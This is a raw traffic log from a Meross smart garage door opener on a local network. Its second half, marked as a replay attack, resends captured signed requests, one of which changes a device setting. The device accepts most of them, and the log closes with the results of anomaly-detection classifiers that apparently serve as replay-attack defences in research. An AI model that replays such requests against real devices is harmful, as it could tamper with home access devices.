POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 310
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"3b196c6ca23ef45bf54b4803ec89742b","method":"GET","namespace":"Appliance.System.All","payloadVersion":1,"sign":"58f0722fd4185a46664935fb5259066f","timestamp":1693945598,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
HTTP/1.1 200 OK
Content-Type: application/json

{"header":{"messageId":"3b196c6ca23ef45bf54b4803ec89742b","namespace":"Appliance.System.All","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1693945600,"timestampMs":921,"sign":"39943fe735b370b68837b3cfe436a233"},"payload":{"all":{"system":{"hardware":{"type":"msg100","subType":"us","version":"4.0.0","chipType":"MT7686","uuid":"2210197269145761070248e1e9abec1b","macAddress":"48:e1:e9:ab:ec:1b"},"firmware":{"version":"4.2.6","homekitVersion":"2.0.1","compileTime":"Oct 24 2022 10:28:41","encrypt":1,"wifiMac":"28:e3:47:c2:d9:cc","innerIp":"10.13.0.32","server":"mqtt-us-2.meross.com","port":443,"userId":3094003},"time":{"timestamp":1693945600,"timezone":"Europe/Rome","timeRule":[[1679792400,7200,1],[1698541200,3600,0],[1711846800,7200,1],[1729990800,3600,0],[1743296400,7200,1],[1761440400,3600,0],[1774746000,7200,1],[1792890000,3600,0],[1806195600,7200,1],[1824944400,3600,0],[1837645200,7200,1],[1856394000,3600,0],[1869094800,7200,1],[1887843600,3600,0],[1901149200,7200,1],[1919293200,3600,0],[1932598800,7200,1],[1950742800,3600,0],[1964048400,7200,1],[1982797200,3600,0]]},"online":{"status":1,"bindId":"U8dHQ2wouexxfAA0","who":1}},"digest":{"togglex":[{"channel":0,"onoff":0,"lmTime":0}],"triggerx":[{"channel":0,"id":"1111111111111111","count":1}],"timerx":[],"garageDoor":[{"channel":0,"open":1,"lmTime":
POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 313
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"d0841fdd6b7c9953d85b71ace941c89e","method":"GET","namespace":"Appliance.System.Online","payloadVersion":1,"sign":"4e79603aee6e84bf89514f335450714b","timestamp":1693945598,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
HTTP/1.1 200 OK
Content-Type: application/json

{"header":{"messageId":"d0841fdd6b7c9953d85b71ace941c89e","namespace":"Appliance.System.Online","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1693945600,"timestampMs":150,"sign":"59b875d724b71183122d86a2c3db8769"},"payload":{"online":{"status":1,"bindId":"U8dHQ2wouexxfAA0","who":1}}}

{"devName":"msg100","devSoftWare":"4.2.6","devHardWare":"4.0.0","ip":"10.13.0.32","port":80,"mac":"48:e1:e9:ab:ec:1b","uuid":"2210197269145761070248e1e9abec1b","deviceType":"msg100","subType":"us"}
{"devName":"msg100","devSoftWare":"4.2.6","devHardWare":"4.0.0","ip":"10.13.0.32","port":80,"mac":"48:e1:e9:ab:ec:1b","uuid":"2210197269145761070248e1e9abec1b","deviceType":"msg100","subType":"us"}
{"devName":"msg100","devSoftWare":"4.2.6","devHardWare":"4.0.0","ip":"10.13.0.32","port":80,"mac":"48:e1:e9:ab:ec:1b","uuid":"2210197269145761070248e1e9abec1b","deviceType":"msg100","subType":"us"}
POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 317
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"87768bdf5a2ac2896fb4b8f3a3a4f964","method":"GET","namespace":"Appliance.GarageDoor.Config","payloadVersion":1,"sign":"0a462e1567370e8c47d003ddef86a8b6","timestamp":1693945605,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 313
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"2c9f7825796462b1a8ce291212394c3f","method":"GET","namespace":"Appliance.Digest.TimerX","payloadVersion":1,"sign":"a33404f224e73d0d13430b1a8f18c97f","timestamp":1693945605,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 314
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"ce2b86673abab95a2d0af74c1b14b862","method":"GET","namespace":"Appliance.System.DNDMode","payloadVersion":1,"sign":"10a8ec3169efabe4de2048aaa3f3afce","timestamp":1693945605,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
HTTP/1.1 200 OK
Content-Type: application/json

{"header":{"messageId":"87768bdf5a2ac2896fb4b8f3a3a4f964","namespace":"Appliance.GarageDoor.Config","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1693945607,"timestampMs":287,"sign":"da3c48ea198d44099d9052cda2004d6e"},"payload":{"config":{"signalDuration":2000,"buzzerEnable":0,"doorOpenDuration":5000,"doorCloseDuration":5000}}}

POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 314
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"0b8281d5e8142651bbcdf9ad8f4b0e95","method":"GET","namespace":"Appliance.System.Runtime","payloadVersion":1,"sign":"1e9d6669638855a1d4b11769cd494b46","timestamp":1693945605,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
HTTP/1.1 200 OK
Content-Type: application/json

{"header":{"messageId":"2c9f7825796462b1a8ce291212394c3f","namespace":"Appliance.Digest.TimerX","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1693945607,"timestampMs":296,"sign":"d303b64ec3313e38fb95a3bec252b01d"},"payload":{"digest":[]}}

HTTP/1.1 200 OK
Content-Type: application/json

{"header":{"messageId":"ce2b86673abab95a2d0af74c1b14b862","namespace":"Appliance.System.DNDMode","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1693945607,"timestampMs":302,"sign":"3c49e002a099b51ed0331b73738441ae"},"payload":{"DNDMode":{"mode":1}}}

POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 317
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"ebded56f724ae3d84b294e5a71d12457","method":"GET","namespace":"Appliance.GarageDoor.Config","payloadVersion":1,"sign":"c9916bdd88ccce5e268a2e8432f2679e","timestamp":1693945605,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
HTTP/1.1 200 OK
Content-Type: application/json

{"header":{"messageId":"0b8281d5e8142651bbcdf9ad8f4b0e95","namespace":"Appliance.System.Runtime","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1693945607,"timestampMs":451,"sign":"681069973f58d8af50fea3187eb54c07"},"payload":{"runtime":{"signal":100}}}

HTTP/1.1 200 OK
Content-Type: application/json

{"header":{"messageId":"ebded56f724ae3d84b294e5a71d12457","namespace":"Appliance.GarageDoor.Config","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1693945608,"timestampMs":539,"sign":"12e4daaf02858ff00dca1c4197b6a5dd"},"payload":{"config":{"signalDuration":2000,"buzzerEnable":0,"doorOpenDuration":5000,"doorCloseDuration":5000}}}

POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 315
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"da2f8a325e5077a69212e74dce24eaf3","method":"GET","namespace":"Appliance.Digest.TriggerX","payloadVersion":1,"sign":"de035f6219da8b030dd0b46415fc525b","timestamp":1693945605,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
HTTP/1.1 200 OK
Content-Type: application/json

{"header":{"messageId":"da2f8a325e5077a69212e74dce24eaf3","namespace":"Appliance.Digest.TriggerX","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1693945608,"timestampMs":637,"sign":"d0fb906db70f53d72c14c81d858e0af5"},"payload":{"digest":[{"channel":0,"id":"1111111111111111","count":1}]}}

POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 334
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"a48bae5d9594f32185cf639ab784686a","method":"SET","namespace":"Appliance.System.DNDMode","payloadVersion":1,"sign":"f16c46ae895369dd8e1f7ea38962f634","timestamp":1693945610,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{"DNDMode":{"mode":0}}}
HTTP/1.1 200 OK
Content-Type: application/json

{"header":{"messageId":"a48bae5d9594f32185cf639ab784686a","namespace":"Appliance.System.DNDMode","triggerSrc":"AndroidLocal","method":"SETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1693945612,"timestampMs":991,"sign":"f8764564639ad5bd554fe65a4e5bfe66"},"payload":{}}

START REPLAY ATTACK
#######################################################################################
sent payload=POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 334
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"a48bae5d9594f32185cf639ab784686a","method":"SET","namespace":"Appliance.System.DNDMode","payloadVersion":1,"sign":"f16c46ae895369dd8e1f7ea38962f634","timestamp":1693945610,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{"DNDMode":{"mode":0}}}
****************************************************************
received payload=HTTP/1.1 200 OK
Content-Type: application/json

{"header":{"messageId":"a48bae5d9594f32185cf639ab784686a","namespace":"Appliance.System.DNDMode","triggerSrc":"AndroidLocal","method":"SETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1693945719,"timestampMs":541,"sign":"fffdfdc87afc8f1cab7c62dc044dcaf3"},"payload":{}}

****************************************************************
sent payload=POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 315
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"da2f8a325e5077a69212e74dce24eaf3","method":"GET","namespace":"Appliance.Digest.TriggerX","payloadVersion":1,"sign":"de035f6219da8b030dd0b46415fc525b","timestamp":1693945605,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
****************************************************************
received payload=HTTP/1.1 200 OK
Content-Type: application/json

{"header":{"messageId":"da2f8a325e5077a69212e74dce24eaf3","namespace":"Appliance.Digest.TriggerX","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1693945719,"timestampMs":591,"sign":"d74f554f47f304995b0581816a94a852"},"payload":{"digest":[{"channel":0,"id":"1111111111111111","count":1}]}}

****************************************************************
sent payload=POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 317
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"ebded56f724ae3d84b294e5a71d12457","method":"GET","namespace":"Appliance.GarageDoor.Config","payloadVersion":1,"sign":"c9916bdd88ccce5e268a2e8432f2679e","timestamp":1693945605,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
****************************************************************
received payload=HTTP/1.1 200 OK
Content-Type: application/json

{"header":{"messageId":"ebded56f724ae3d84b294e5a71d12457","namespace":"Appliance.GarageDoor.Config","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1693945719,"timestampMs":604,"sign":"8fe30645f6f216db8457c7ef0f7541cc"},"payload":{"config":{"signalDuration":2000,"buzzerEnable":0,"doorOpenDuration":5000,"doorCloseDuration":5000}}}

****************************************************************
sent payload=POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 314
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"0b8281d5e8142651bbcdf9ad8f4b0e95","method":"GET","namespace":"Appliance.System.Runtime","payloadVersion":1,"sign":"1e9d6669638855a1d4b11769cd494b46","timestamp":1693945605,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
****************************************************************
received payload=HTTP/1.1 200 OK
Content-Type: application/json

{"header":{"messageId":"0b8281d5e8142651bbcdf9ad8f4b0e95","namespace":"Appliance.System.Runtime","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1693945719,"timestampMs":674,"sign":"d4e9720ae1af7fab0224cc48911a55a4"},"payload":{"runtime":{"signal":100}}}

****************************************************************
sent payload=POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 317
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"87768bdf5a2ac2896fb4b8f3a3a4f964","method":"GET","namespace":"Appliance.GarageDoor.Config","payloadVersion":1,"sign":"0a462e1567370e8c47d003ddef86a8b6","timestamp":1693945605,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
****************************************************************
received payload=HTTP/1.1 200 OK
Content-Type: application/json

{"header":{"messageId":"87768bdf5a2ac2896fb4b8f3a3a4f964","namespace":"Appliance.GarageDoor.Config","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1693945719,"timestampMs":691,"sign":"f28e1063f17528ccf249de056bb7fdbe"},"payload":{"config":{"signalDuration":2000,"buzzerEnable":0,"doorOpenDuration":5000,"doorCloseDuration":5000}}}

****************************************************************
sent payload=POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 313
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"2c9f7825796462b1a8ce291212394c3f","method":"GET","namespace":"Appliance.Digest.TimerX","payloadVersion":1,"sign":"a33404f224e73d0d13430b1a8f18c97f","timestamp":1693945605,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
****************************************************************
received payload=
****************************************************************
sent payload=POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 314
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"ce2b86673abab95a2d0af74c1b14b862","method":"GET","namespace":"Appliance.System.DNDMode","payloadVersion":1,"sign":"10a8ec3169efabe4de2048aaa3f3afce","timestamp":1693945605,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
****************************************************************
received payload=
****************************************************************
sent payload=POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 313
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"d0841fdd6b7c9953d85b71ace941c89e","method":"GET","namespace":"Appliance.System.Online","payloadVersion":1,"sign":"4e79603aee6e84bf89514f335450714b","timestamp":1693945598,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
****************************************************************
received payload=HTTP/1.1 200 OK
Content-Type: application/json

{"header":{"messageId":"d0841fdd6b7c9953d85b71ace941c89e","namespace":"Appliance.System.Online","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1693945719,"timestampMs":708,"sign":"1926e301b685a66ffbd4f66c35b639a4"},"payload":{"online":{"status":1,"bindId":"U8dHQ2wouexxfAA0","who":1}}}

****************************************************************
sent payload=POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 310
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"3b196c6ca23ef45bf54b4803ec89742b","method":"GET","namespace":"Appliance.System.All","payloadVersion":1,"sign":"58f0722fd4185a46664935fb5259066f","timestamp":1693945598,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
****************************************************************
received payload=HTTP/1.1 200 OK
Content-Type: application/json

{"header":{"messageId":"3b196c6ca23ef45bf54b4803ec89742b","namespace":"Appliance.System.All","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1693945719,"timestampMs":729,"sign":"f35d811f07f95f5b28b25186488b01f9"},"payload":{"all":{"system":{"hardware":{"type":"msg100","subType":"us","version":"4.0.0","chipType":"MT7686","uuid":"2210197269145761070248e1e9abec1b","macAddress":"48:e1:e9:ab:ec:1b"},"firmware":{"version":"4.2.6","homekitVersion":"2.0.1","compileTime":"Oct 24 2022 10:28:41","encrypt":1,"wifiMac":"28:e3:47:c2:d9:cc","innerIp":"10.13.0.32","server":"mqtt-us-2.meross.com","port":443,"userId":3094003},"time":{"timestamp":1693945719,"timezone":"Europe/Rome","timeRule":[[1679792400,7200,1],[1698541200,3600,0],[1711846800,7200,1],[1729990800,3600,0],[1743296400,7200,1],[1761440400,3600,0],[1774746000,7200,1],[1792890000,3600,0],[1806195600,7200,1],[1824944400,3600,0],[1837645200,7200,1],[1856394000,3600,0],[1869094800,7200,1],[1887843600,3600,0],[1901149200,7200,1],[1919293200,3600,0],[1932598800,7200,1],[1950742800,3600,0],[1964048400,7200,1],[1982797200,3600,0]]},"online":{"status":1,"bindId":"U8dHQ2wouexxfAA0","who":1}},"digest":{"togglex":[{"channel":0,"onoff":0,"lmTime":0}],"triggerx":[{"channel":0,"id":"1111111111111111","count":1}],"timerx":[],"garageDoor":[{"channel":0,"open":1,"lmTime":
****************************************************************
REPLAY ATTACK NOT SUCCESSFUL WITH CLF=OneClassSVM(gamma='auto', nu=0.001)
REPLAY ATTACK SUCCESSFUL WITH CLF=IsolationForest(contamination=0.01)
REPLAY ATTACK SUCCESSFUL WITH CLF=EllipticEnvelope(contamination=0.01)
REPLAY ATTACK SUCCESSFUL WITH CLF=LocalOutlierFactor(contamination=0.01, novelty=True)
REPLAY ATTACK SUCCESSFUL WITH CLF=CustomClassifier()
END REPLAY ATTACK
